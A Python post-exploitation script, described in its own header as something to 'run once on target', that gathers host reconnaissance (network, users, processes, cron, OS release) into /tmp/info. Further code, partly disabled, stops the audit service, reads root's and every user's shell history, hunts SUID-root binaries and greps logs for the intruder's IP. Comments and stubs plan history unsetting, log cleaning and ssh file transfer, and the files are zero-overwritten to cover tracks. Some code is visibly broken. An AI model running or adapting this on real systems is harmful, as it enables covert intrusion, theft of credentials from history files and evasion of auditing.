#! /usr/bin/python3
# script to run once on target
# used to determine whether or not to continue
# and gather information

from datetime import *
import os, sys
import subprocess
import socket
from glob import *

##########################################
## preliminary data
# date - time to clean logs from
# ifconfig - right box?
## hostname
## uname -a
## cat/ etc/*release
## free -m # available memory
# who else is there?
## w
## last
## whoami - permissions you currently have
# what is running?
## netstat -auntp
## ps -efH
## uptime
## crontab -l

#unset HISTFILE
#unset HISTSIZE
#unset HISTFILESIZE

# is privilege escalation is needed?
##########################################

def preLim():
    everything=[]
    everything.append(datetime.now())

    ntwk=bashCmd("ifconfig")
    ntwk=ntwk.split('\n\n')
    netInfo={'Up':[()],'Down':[()]}
    for i in range (0,len(ntwk)):
        tmp=ntwk[i].split('\n')
        if ("UP" in tmp[0]) and ("inet" in tmp[1]):
            dev=tmp[0].split(':')[0]
            ip=tmp[1].split()[1]
            netm=tmp[1].split()[3]
            netInfo['Up'].append((dev,ip,netm))
        elif "UP" in tmp[0]:
            dev=tmp[0].split(':')[0]
            netInfo['Up'].append(dev)
        else:
            dev=tmp[0].split(':')[0]
            netInfo['Down'].append(dev)
    #for j in netInfo.keys():
    #    print(netInfo[j])
    everything.append("ifconfig")
    everything.append(netInfo)  
    everything.append(socket.gethostname())
    everything.append(bashCmd("uname -a"))
    
    osRel=""
    for name in glob('/etc/*'):
        if "release" in name:
            osRel+=bashCmd('cat '+name)
    
    everything.append("OS Release Info")
    everything.append(osRel)
    everything.append(bashCmd("free -m"))
    everything.append(bashCmd("w"))
    everything.append(bashCmd('last'))
    everything.append('I am')
    everything.append(bashCmd("whoami"))
    everything.append("netstat")
    everything.append(bashCmd("netstat -antup"))
    everything.append("processes")
    everything.append(bashCmd("ps -efH"))
    everything.append("uptime")
    everything.append(bashCmd("uptime"))
    everything.append("cron")
    everything.append(bashCmd("crontab -l"))

    for i in range(0,len(everything)):
        w2File(everything[i],"preLiminary")

    #result=bashCmd("unset HISTFILE",1)
    #result=bashCmd("unset HISTSIZE",1)
    #result=bashCmd("unset HISTFILESIZE",1)
    #result=bashCmd("/root/Desktop/hist.sh")


##########################################
## other, less critical info
# cd /tmp
# service audit stop
# lsof -l nP # show opened file handles to ps's
# lsb_release 
# grep -v "^#||^$" /etc/crontab /var/spool/cron/crontabs/* /etc/cron.* /etc/cron.d/* /var/spool/cron/atjobs/* 2>/dev/null
# atq
# ...
##########################################

def nextStuff():
    every=[]
    os.chdir('/tmp')
    try:
        result=bashCmd("service audit stop")
    except:
        result=bashCmd("systemctl stop audit")
    #if(result==1): every.append("auditting stopped")
    #else: print("audit on")
    every.append(bashCmd("lsof -l nP"))
    every.append(bashCmd("lsb_release"))
    every.append(bashCmd("grep -v \"^#||^$\" /etc/crontab /var/spool/cron/crontabs/* /etc/cron.* /etc/cron.d/* /va/spool/cron/atjobs/* 2>/dev/null"))
    try:
        every.append(bashCmd("atq"),1)
    except:
        pass # print("no atq")
    every.append(bashCmd("cat /root/.bash_history /home/*/*history"))
    every.append(bashCmd("find / -type f -name \".*\""))
    every.append(bashCmd("find / -type d -name \".*\""))
    every.append(bashCmd("service --status-all"))
    try:
        every.append(bashCmd("chkconfig --list"))
    except:
        every.append("no chkconfig")
    try: 
        result=bashCmd("ulimit -c",1)
        every.append("ulimit -c: "+result)
    except: pass # print("no ulimit")
    
    w2File(bashCmd("ls -laR /home"),"homeTree")
    w2File(bashCmd("ls -laR / "),"fullTree")
    every.append(bashCmd("find / -uid 0 -perm -4000"))
    every.append(bashCmd("find /var/log -type f -mmin 30"))
    every.append(bashCmd("grep -n \"192.168.1.145\" /var/log/*"))

    for i in range(0,len(every)):
        w2File(every[i],"nextInfo")


##########################################
## functions

def bashCmd(cmd,i=0):    
    cmd2=cmd.split()
    if(i==0):
        result=subprocess.run(cmd2,stdout=subprocess.PIPE,
                stderr=subprocess.PIPE).stdout.decode('utf-8')
    else:
        result=subprocess.run(cmd2,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True).stdout.decode('utf-8')
    return result; #cmd,result);

def w2File(result,filename,i=0):
    if(i==0):
        with open("/tmp/info/"+filename,'a') as f:
            print(result,file=f)
            sep="------------------------------------"
            print(sep+sep+sep,file=f)
        #for r in result:
        #    print(r[0],"\n",r[1],file=f)
    else:
        with open("/tmp/info/"+filename,'w') as f:
            print(result,file=f)

def xferFile():
    # encode and gzip, then xfer
    # uuencode -m <file to encode>
    # ssh <IP> uuencode -m /bin/ls - | unudecode > ls
    pass

def logClean():
    try:
        today=datetime.now()
        months=["Jan","Feb","Mar","Apr","May","Jun",
                "Jul","Aug","Sep","Oct","Nov","Dec"]
        logs=bashCmd("ls -latr /var/logs | grep "
                +"\""+months[today.month]+ " "+today.day+"\"")
        logsToClean=logs.split("\n")
        #for i in range(0,len(logsToClean)):
        #    print(logsToClean[i])
    except:
        pass
    files=bashCmd("ls /tmp/info")
    files2=files.split()
    print(files2)
    for i in range(0,len(files2)):
        ###############################################scp here!!
        size=bashCmd("ls -latr /tmp/info/"+files2[i]).split()    
        bashCmd("dd if=/dev/zero of=/tmp/info/"+files2[i]+
                " bs=1 count="+size[4])
        # remove file

##########################################

if not os.path.exists('/tmp/info'):
    os.makedirs('/tmp/info')

preLim()
#nextStuff()
#xferFile()
logClean()
